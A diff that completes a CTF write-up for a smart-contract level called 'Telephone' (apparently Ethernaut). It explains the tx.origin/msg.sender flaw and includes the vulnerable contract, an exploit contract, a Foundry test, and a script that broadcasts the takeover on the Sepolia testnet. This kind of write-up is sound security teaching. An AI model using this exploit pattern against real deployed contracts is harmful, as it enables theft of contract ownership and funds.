@@ -1,26 +1,46 @@
-## 
+## 04. Telephone
 
 <br>
 
 
+  
+<p align="center">
+<img width="200" src=""">
+</p>
+
+<br>
 ### tl; dr
 
 <br>
 
-
-* 
-
-<br>
-  
-<p align="center">
-<img width="500" src=""">
-</p>
-
+* in this challenge, we exploit the difference between `tx.origin` and `msg.sender` to to *phish* with `tx.origin` and become `owner`.
+    - `tx.origin` refers to the EOA that initiated the transaction (which can be many calls ago, and never be a contract), while `msg.sender` is the immediate caller (and can be a contract).
 
 <br>
 
-```solidity
+* fun fact, this type of vulnerability resembles web2's **cross-site request forgery (csrf)**. 
+    - exactly a decade ago, when i was getting started in security research and csrf was still heavily in the wild, **[i wrote a modification of apache's `mod_security` to monitoring for it](https://github.com/go-outside-labs/csrf)**. 
+    - it's wild how the world has changed in 10 years...
 
+<br>
+
+```solidity 
+pragma solidity ^0.8.0;
+
+contract Telephone {
+
+  address public owner;
+
+  constructor() {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
 ```
 
 
@@ -32,9 +52,59 @@
 
 <br>
 
+* `Telephone()` contract is pretty simple. first, it declares a **state variable** called `owner` (state variables have values permanently stored in a contract storage):
 
 <br>
 
+```solidity
+address public owner;
+```
+
+<br>
+
+* then we have a constructor that defines that the EOA who deploys this contract is its `owner`:
+
+<br>
+
+```solidity
+constructor() {
+    owner = msg.sender;
+}
+```
+
+<br>
+
+
+* finally, we have a function to change the owner, which checks if the caller is not the owner to give the ownership. this function is our target, and to exploit it, we need to make sure that `tx.origin` and `msg.sender` are not the same:
+
+<br>
+
+```solidity
+function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+}
+```
+
+<br>
+
+* this can be done by creating an intermediary contract that makes a call to `Telephone()`. this is our exploit:
+
+<br>
+
+```solidity
+import {Telephone} from "src/04/Telephone.sol";
+
+contract TelephoneExploit {
+    
+    function run(Telephone level) public {
+        level.changeOwner(msg.sender);
+  }
+}
+```
+
+<br>
 
 
 ----
@@ -43,36 +113,41 @@
 
 <br>
 
-* check `test/.t.sol`:
+* first, we test our solution at `test/04/Telephone.t.sol`:
 
 <br>
 
 ```solidity
-
-```
-
-<br>
-
-* run:
-
-<br>
-
-```shell
-> forge test --match-contract Test -vvvv    
+import "forge-std/Test.sol";
+import {Telephone} from "src/04/Telephone.sol";
+import {TelephoneExploit} from "src/04/TelephoneExploit.sol";
 
 
-```
+contract TelephoneTest is Test {
 
+    Telephone public level;
 
+    address instance = vm.addr(0x1); 
+    address hacker = vm.addr(0x2); 
 
-<br>
+    function setUp() public {
+        vm.prank(instance);
+        level = new Telephone();
+    }
 
-* submit with `script/.s.sol`:
+    function testTelephoneHack() public {
 
-<br>
+        vm.startPrank(hacker);
+        assertNotEq(level.owner(), hacker);
 
-```solidity
+        TelephoneExploit exploit = new TelephoneExploit();
+        exploit.run(level);
 
+        assertEq(level.owner(), hacker);
+        vm.stopPrank();
+        
+    }
+}
 ```
 
 <br>
@@ -82,9 +157,49 @@
 <br>
 
 ```shell
-> forge script ./script/0.s.sol --broadcast -vvvv --rpc-url sepolia
+> forge test --match-contract TelephoneTest -vvvv    
+```
 
 
+
+<br>
+
+* once it passes, we submit the solution with `script/04/Telephone.s.sol`:
+
+<br>
+
+```solidity
+import "forge-std/Script.sol";
+import {Telephone} from "src/04/Telephone.sol";
+import {TelephoneExploit} from "src/04/TelephoneExploit.sol";
+
+contract Exploit is Script {
+
+        address levelInstance = 0x63f80459C2CBa9692DFA70eD43c66423a9596c02;
+        address hacker = vm.envAddress("PUBLIC_KEY");
+
+        Telephone level = Telephone(levelInstance);        
+        
+        function run() external {
+
+            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+            
+            TelephoneExploit exploit = new TelephoneExploit();
+            exploit.run(level);
+
+            vm.stopBroadcast();
+    }
+}
+```
+
+<br>
+
+* by running:
+
+<br>
+
+```shell
+> forge script ./script/04/Telephone.s.sol --broadcast -vvvv --rpc-url sepolia
 ```
 
 <br>
